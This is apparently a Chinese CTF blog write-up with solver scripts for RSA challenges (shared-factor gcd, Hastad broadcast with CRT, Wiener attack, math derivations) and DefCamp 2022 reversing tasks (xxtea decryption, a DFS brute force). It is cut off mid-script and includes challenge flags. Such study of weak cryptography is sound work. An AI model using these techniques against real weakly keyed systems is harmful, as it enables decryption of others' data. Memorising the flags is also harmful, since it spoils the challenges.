14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842n16 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451c16 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724n17 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499c17 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024n18 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973c18 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887n19 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603c19 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889n20 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659c20 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346cList = [c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19,c20]nList = [n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19,n20]e = 65537for i in range(len(nList)): for j in range(len(nList)): if i!= j: if gmpy2.gcd(nList[i],nList[j]) != 1: print(i,j) print(gmpy2.gcd(nList[i],nList[j]))# 4 17# 132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499q = 132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499p = nList[4]//qd = gmpy2.invert(e,(p-1)*(q-1))m = pow(cList[4],d,nList[4])print(long_to_bytes(m))# flag{abdcbe5fd94e23b3de429223ab9c2fdf} [脚本参考](https://blog.csdn.net/weixin_44017838/article/details/104878645?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164958629416780261970846%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164958629416780261970846&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-104878645.142 ** v7 ** pc_search_result_control_group,157 ** v4 ** control&amp;utm_term=RSA5&amp;spm=1018.2226.3001.4187) 低加密指数广播攻击(中国剩余定理)RSA4 (中国剩余定理+低加密指数攻击)来复习一下加密和解密的规则 12c = m ** e % nm = c ** d % n 题目给了三个N和三个C，考虑用中国剩余定律（CRT）求出m ** e。 这题给出的数据仔细观察，可以知道是五进制数据，所以还需要转化，int(x,5)即可 题目中还没有给出e，这种题目中e通常都很小，低指数加密，只需要遍历求出的m ** e，开对应的根号即可。 1234567891011121314151617181920212223242526272829303132333435import gmpy2from Crypto.Util.number import *#利用中国剩余定理求解同余方程，aList：余数，mList：模数def CRT(aList, mList): M = 1 for i in mList: M = M * i #计算M = ∏ mi #print(M) x = 0 for i in range(len(mList)): Mi = M // mList[i] #计算Mi Mi_inverse = gmpy2.invert(Mi, mList[i]) #计算Mi的逆元 x += aList[i] * Mi * Mi_inverse #构造x各项 x = x % M return xif __name__ == &quot;__main__&quot;: #========== n c ========== n1 = &quot;331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004&quot; c1 = &quot;310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243&quot; n2 = &quot;302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114&quot; c2 = &quot;112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344&quot; n3 = &quot;332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323&quot; c3 = &quot;10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242&quot; cList = [int(c1,5), int(c2,5), int(c3,5)] nList = [int(n1,5), int(n2,5), int(n3,5)] m_e = CRT(cList, nList) #计算m ** e for e in range(1, 10): #遍历e求解 m, f = gmpy2.iroot(m_e, e) #m_e开e次根 print(&quot;加密指数e = %d：&quot;%e) flag = long_to_bytes(m) print(flag)# noxCTF{D4mn_y0u_h4s74d_wh47_4_b100dy_b4s74rd!} 代码来源 rsa-wiener-attackrsa2方法一：在线分解123456N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085import hashlibflag = &quot;flag{&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;}&quot; 在线网站分解出p和q 脚本： 12345678import gmpy2p = 9046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183q = 11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937d = gmpy2.invert(e,(p-1)*(q-1))flag = &quot;flag{&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;}&quot;print(flag) 注意该脚本需要在python2环境中跑出来，如果在python3中，则会提醒需要编码，而且结果不一致…… 方法二：rsa-wiener-attack当e非常大，和n差不多大的时候，就能考虑使用wiener-attack脚本来解题了。 使用的脚本https://github.com/pablocelayes/rsa-wiener-attack 需要将脚本放在rsa-wiener-attack-master的目录下。 1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import *from Crypto.PublicKey import RSAimport ContinuedFractions, Arithmeticimport gmpy2import hashlibe = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085n = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471def wiener_hack(e, n): frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(&quot;Hacked!&quot;) return d return Falsed = wiener_hack(e, n)print(d)print(hex(d))flag = &quot;flag{&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;}&quot;print(flag) 注意该脚本也需要在python2环境中跑 数学推理[BJDCTF2020]easyrsa （反三角函数求导）123456789101112131415161718192021from Crypto.Util.number import getPrime,bytes_to_longfrom sympy import Derivativefrom fractions import Fractionfrom secret import flagp=getPrime(1024)q=getPrime(1024)e=65537n=p*qz=Fraction(1,Derivative(arctan(p),p)) - Fraction(1,Derivative(arth(q),q))m=bytes_to_long(flag)c=pow(m,e,n)print(c,z,n)'''output其中Fraction()是分数，Fraction(1,x)就是求倒数 Derivative(f(x),x)是求f(x)关于x的导数 反正切函数arctanx的求导公式：1 /（ 1 + x^2 ） 反双曲正切 arthx的求导公式：1 /（1 - x^2 ) 所以 z = p ^ 2 + q ^ 2 因为p*q = n，所以我们通过z3来求解p和q 12345678910111213from z3 import *z = 32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482n = 15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441x = Solver()p,q = Ints(&quot;p q&quot;)x.add(p*q == n)x.add(p**2 + q**2 == z)x.check()print(x.model())# p = 144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301# q = 105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141 然后就顺水推舟了 1234567891011import gmpy2from Crypto.Util.number import *p = 144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301q = 105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141c = 7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035e = 65537n = p * qd = gmpy2.invert(e, (q-1)*(p-1))m = pow(c,d,n)print(long_to_bytes(m))# BJD{Advanced_mathematics_is_too_hard!!!} [RoarCTF2019]RSA （推导+爆破e）1234567A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/xp=next_prime(z*x*y)q=next_prime(z)A = 2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724n = 117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127c = 41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128 这题首先是需要求出x和y的值，通过计算可以列出以下的等式 12345import gmpy2y = gmpy2.iroot(A,316)[0]x = (y+1) // (A - y**316 - 1)# y = 83# x = 2 p和q是通过x,y,z生成的，可以确定的是，p约是q的166倍，这样我们大概可以求出z的范围，进而可以通过爆破，确定q的值， 12345678z = gmpy2.iroot(n//166,2)[0]for i in range(2,100000): p = z+i if n % p == 0: print(i,p) break# i = 546 p = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 题目中没有给出我们e值，我们选择爆破e 1234567891011121314q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569p = n//qphi = (p-1)*(q-1)for e in range(2,100000): if gmpy2.gcd(e,phi) != 1: #e的值，需要与phi满足互质的关系 continue d = gmpy2.invert(e,phi) m = pow(c,d,n) flag = str(long_to_bytes(m)) if &quot;CTF&quot; in flag or &quot;flag&quot; in str(flag): print(e,flag) break# 65537 b'RoarCTF{wm-l1l1ll1l1l1l111ll}' 这题看似简单，其实很头疼，如何通过给出的A，推断出x,y，再推断出z的范围，小范围爆破出q，最后还需要爆破e，花的时间挺久的…… 当然，我尝试了一下在线分解，成功了。但是我认为，比赛中一般不会给出可以轻易分解的n，所以需要锻炼自己数学推理的能力。 过程中自己还编写了一个isPrime函数，和next_prime(n)函数来测试，贴在这边备用（当然使用sympy.nextprime()函数更佳） 12345678910111213141516171819import gmpy2import mathprime = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541]def isPrime(n): for pri in prime: if n == pri: continue if n % pri == 0: return False return Truedef next_prime(n): i = 1 while True: if isPrime(n+i): return n+i break i += 1 [RoarCTF2019]babyRSA (威尔逊定理)12345678910111213141516171819202122232425import sympyimport randomdef myGetPrime(): A= getPrime(513) print(A) B=A-random.randint(1e3,1e5) print(B) return sympy.nextPrime((B!)%A)p=myGetPrime()#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596q=myGetPrime()#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026r=myGetPrime()n=p*q*r#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733c=pow(flag,e,n)#e=0x1001#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428#so,what is the flag? 513位数字的阶乘？蒙了，看大佬的博客才知道原来使用的是威尔逊定律，强到窒息…… 简单阐述一下威尔逊定律，就是对于素数n来说，(n - 1)!%n = -1 (A - 1) 由题目可以得知： p 约等于 (B1!)%A1 A1是质数，由威尔逊定律可以得出：(A1 - 1)!%A1 = -1 % A 而B1 = A1 - randint(1e3,1e5) (A1 - 1) * (A1 - 2) * (A1- 3) …… (B1+1) * B1！% A1 = -1 % A 推算一下： (A1 - 2) * (A1- 3) …… (B1+1) * B1！% A1 = 1 % A1 (A1 - 2) * (A1- 3) …… (B1+1)与 B1！% A1是关于A1的模逆，这样就能求出B1！% A1的值了 然后通过在通过sympy.nextprime()函数算出p 123456789101112131415161718192021222324252627282930import sympyimport mathimport gmpy2from Crypto.Util.number import *A1 = 21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407B1 = 21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596A2 = 16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927B2 = 16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026n = 85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733c = 75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428def get_value(A,B): s = 1 for i in range(B+1,A-1): s *= i s %= A value = gmpy2.invert(s,A) return sympy.nextprime(value)p = get_value(A1,B1)q = get_value(A2,B2)r = n//p//qphi = (p-1)*(q-1)*(r-1)e=0x1001d = gmpy2.invert(e,phi)m = pow(c,d,n)flag = long_to_bytes(m)print(flag)# RoarCTF{wm-CongrAtu1ation4-1t4-ju4t-A-bAby-R4A}","link":"/2022/03/22/BUU_crypto/rsa%E5%90%88%E9%9B%86/"},{"title":"2022_DefCamp_CTF","text":"复现一下2022DefCampCTF Reversecup_of_tea (xxtea+小端)python实现tea/xtea/xxtea算法传送门：https://qianfei11.github.io/2019/08/22/Python%E5%AE%9E%E7%8E%B0TEA%E3%80%81XTEA%E3%80%81XXTEA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/ v7字符串经过加密之后是运行后的C7……字符串 1234We are under attack.We need a group of hacker to decrypt this weird message.And Betaflash is not slow :)).Decrypt me if you can: C7E4C81E20EBFB67A4977BA91C9C312FFF81669CA85798D475F0D9081DF7017CC8D009ADF02F67DD41D1F781EF56F8EA2225502AF957D6844084CEE3BB7D2350DBF05DCD8B0AD33CD52C5E0171E4 我们需要做的是通过上面的加密去寻找解密方法，然后把下面的字符串破译出来 ida查看一下： encrypt函数看了一眼是tea类的加密，sprintf，发送格式化输出到v13字符串，%02x，两位十六进制数，左侧补零。 放C里面调试了一下…… 这边就是主要的算法了。 在网上找了一段有关xxtea加密解密的python2版本的代码，然后转成了python3的格式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 / n x = (int(rounds) * delta) &amp; 0xFFFFFFFFFFFFFFFF y = v[0] for i in range(int(rounds)): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFFFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFFFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFFFFFFFFFF return vdef encrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 / n x = 0 z = v[n - 1] for i in range(int(rounds)): x = (x + delta) &amp; 0xFFFFFFFFFFFFFFFF e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1): y = v[p + 1] v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFFFFFFFFFF z = v[p] p += 1 y = v[0] v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFFFFFFFFFF z = v[n - 1] return vif __name__ == '__main__': plain = [1, 2] key = [2, 2, 3, 4] encrypted = encrypt(plain, key) print (encrypted) decrypted = decrypt(encrypted, key) print (decrypted) 关键部分做了替换。其中，最为重要的是，题目给出的字符串因为小端模式需要转换 12encrypted = [0x68E399CC4DAEA4D0,0x81b8676d9966bdba,0x78adb022d0e2ab59,0xf31ce8b16e9ad6f1,0xd6054099FE3E9B58,0xB7443CFDB29DDEA9,0x2922AC6A31D22876,0x2022E42B93EC38E9,0x0A825546911D6DDD,0x8D3A9936229EC043]key = [73,32,108,111,118,101,32,112,97,110,99,97,107,101,115] 注意这边的6+52/n换成了6+52/10 1[6859953592044237650, 5070864542475440945, 6436263400528900656, 3370575, 0, 0, 0, 0, 0, 0] 然后将所得的列表，转换成16进制，按每两位一组，拼接成flag 1string = '5f33737245763352465f546f4e5f533159523376455f7230336e4f' 123456x = [0x5f,0x33,0x73,0x72,0x45,0x76,0x33,0x52,0x46,0x5f,0x54,0x6f,\\0x4e,0x5f,0x53,0x31,0x59,0x52,0x33,0x6e,0x4f]flag = &quot;&quot;for i in range(len(x)): flag+=chr(x[i])print(flag) _3srEv3RF_ToN_S1YR3nO CTF{3e6a586b00305bc4e74243c66d91525a} algorithm (dfs plus+暴破 plus)123456789101112131415161718192021222324252627282930flag = ' [test]'hflag = flag.encode('hex')iflag = int(hflag[2:], 16)def polinom(n, m): i = 0 z = [] s = 0 while n &gt; 0: if n % 2 != 0: z.append(2 - (n % 4)) else: z.append(0) n = (n - z[i])/2 i = i + 1 z = z[::-1] l = len(z) for i in range(0, l): s += z[i] * m ** (l - 1 - i) return si = 0r = ''while i &lt; len(str(iflag)): d = str(iflag)[i:i+2] nf = polinom(int(d), 3) r += str(nf) i += 2print r 放linux运行了一下，仔细分析之后，得出正向加密的步骤： 将flag字符串中每一个字符都转换为16进制数拼凑起来的数,赋值给hflag， 将hflag开头两位去除后转换的10进制数，赋值为iflag。 依次iflag每两位拆分为n，将n和3分别作为一参和二参放入polinom中进行加密：将n通过while循环根据奇偶转换为z表，对z表中的每个元素*m^i后累加为s，返回值为s。 加密结束后，把最后的结果赋值给nf，转换成str，拼在一起就是加密后的字符。 本人用 “ [hello]”进行了模拟运算 12345678910111213141516171819202122232425262728293031323334def polinom(n, m): i = 0 z = [] s = 0 while n &gt; 0: if n % 2 != 0: z.append(2 - (n % 4)) else: z.append(0) n = (n - z[i])/2 i = i + 1 print &quot;z:&quot;, print (z) l = len(z) for i in range(0, l): s += z[i] * m ** i return sflag = ' [hello]'hflag = flag.encode('hex')print(hflag)iflag = int(hflag[2:],16)print(iflag)i = 0r = ''while i &lt; len(str(iflag)): d = (str(iflag)[i:i+2]) print(d) nf = polinom(int(d),3) print &quot;nf:&quot;, print(nf) r += str(nf) i += 2print(r) 若m为99(最大的两位数)，while循环后，累加出来的s为1952，所以两位数最多可以被加密成4位数（见以上步骤3） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647def polinom(n, m): i = 0 z = [] s = 0 while n &gt; 0: if n % 2 != 0: z.append(2 - (n % 4)) else: z.append(0) n = (n - z[i]) // 2 i = i + 1 z = z[::-1] l = len(z) for i in range(0, l): s += z[i] * m**(l - 1 - i) return s def print_b(b): s = str(b[0]) for i in b[1:-1]: if i &lt; 10: s = s + &quot;0&quot; + str(i) print(s) else: s = s + str(i) res = s + str(b[-1]) print(res)b = []a = '242712673639869973827786401934639193473972235217215301'def dfs(n): global b if (n &gt; len(a)): return if (n == len(a)): m = print_b(b) return for i in range(1, 5): s = a[n:n + i] for j in range(100): if (polinom(j, 3) == int(s)): b.append(j) dfs(n + i) b.pop()dfs(0) 通过dfs和爆破，求出了列表b，其应当为加密函数polinom(n, m) 返回值s组成的列表： 1[31, 11, 38, 2, 44, 3, 54, 68, 8, 14, 45, 91, 44, 91, 69, 12, 29, 25, 23, 10, 1] 然后通过print_b的填零操作，将列表b转换成iflag 131113802440354680814459144916912292523101 注意，b列表的最后一位不需要在前面加上“0”， 最后通过long_to_bytes将iflag转换为flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from Crypto.Util.number import *def polinom(n, m): i = 0 z = [] s = 0 while n &gt; 0: if n % 2 != 0: z.append(2 - (n % 4)) else: z.append(0) n = (n - z[i]) // 2 i = i + 1 z = z[::-1] l = len(z) for i in range(0, l): s += z[i] * m**(l - 1 - i) return s def print_b(b): s = str(b[0]) for i in b[1:-1]: if i &lt; 10: s = s + &quot;0&quot; + str(i) print(s) else: s = s + str(i) res = s + str(b[-1]) print(res) #将还原出的b列表转换为一个十进制数b = []a = '242712673639869973827786401934639193473972235217215301'#通过dfs和循环将拼接的 nf 还原出来def dfs(n): global b if (n &gt; len(a)): return if (n == len(a)): m = print_b(b) return for i in range(1, 5): s = 